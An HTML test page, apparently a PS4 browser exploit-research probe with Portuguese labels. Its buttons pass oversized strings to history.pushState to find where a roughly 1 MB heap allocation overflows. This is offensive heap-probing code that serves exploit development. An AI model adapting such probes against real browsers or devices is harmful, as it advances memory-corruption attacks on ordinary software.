<!DOCTYPE html>
<html>
<head>
    <title>PS4 Bucket Limit Finder</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 20px; padding: 20px; margin: 10px; cursor: pointer; 
            width: 90%; border: 1px solid #aaa; background: #222; color: #fff;
        }
        .step-1 { border-color: #00ff00; color: #00ff00; }
        .step-2 { border-color: #ffff00; color: #ffff00; }
        .step-3 { border-color: #ffaa00; color: #ffaa00; }
        .step-4 { border-color: #ff0000; color: #ff0000; font-weight: bold; }
        #log { margin-top: 20px; border: 1px solid #555; padding: 15px; color: cyan; }
    </style>
</head>
<body>

    <h1>Encontrando o Limite do Bloco (1MB?)</h1>
    <p>Precisamos encher o balde até transbordar.</p>

    <div id="log">Pronto. Base: 709.522 bytes.</div>

    <button class="step-1" onclick="testFill(100000)">1. Adicionar +100KB</button>
    <button class="step-2" onclick="testFill(200000)">2. Adicionar +200KB</button>
    <button class="step-3" onclick="testFill(300000)">3. Adicionar +300KB</button>
    <button class="step-4" onclick="testFill(350000)">4. Adicionar +350KB (Transbordo?)</button>

    <script>
        const BASE_OFFSET = 709522;

        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function testFill(extraBytes) {
            log("Testando Base + " + extraBytes + " bytes de enchimento...");
            
            setTimeout(() => {
                try {
                    // 1. Base
                    let buffer = "A".repeat(BASE_OFFSET);
                    
                    // 2. Enchimento Massivo (0x01)
                    // Se estivermos num balde de 1MB, precisamos de cerca de 340.000 bytes pra encher
                    buffer += "\x01".repeat(extraBytes);

                    // Dispara
                    history.pushState({}, "fill_test_" + extraBytes, "/" + buffer);
                    
                    // Se chegar aqui, o balde ainda tinha espaço ou sobrescrevemos algo não vital
                    log("SOBREVIVEU! Tamanho total: " + (BASE_OFFSET + extraBytes));
                    
                    // Cálculo de quanto falta para 1MB
                    let total = BASE_OFFSET + extraBytes;
                    let target = 1048576; // 1MB
                    if (total < target) {
                        log("Ainda faltam " + (target - total) + " bytes para 1MB.");
                    } else {
                        log("PASSOU DE 1MB! Estamos fora do balde!");
                        document.body.style.backgroundColor = "#550000";
                    }

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 1000); // Delay maior para alocação grande
        }
    </script>
</body>
</html>
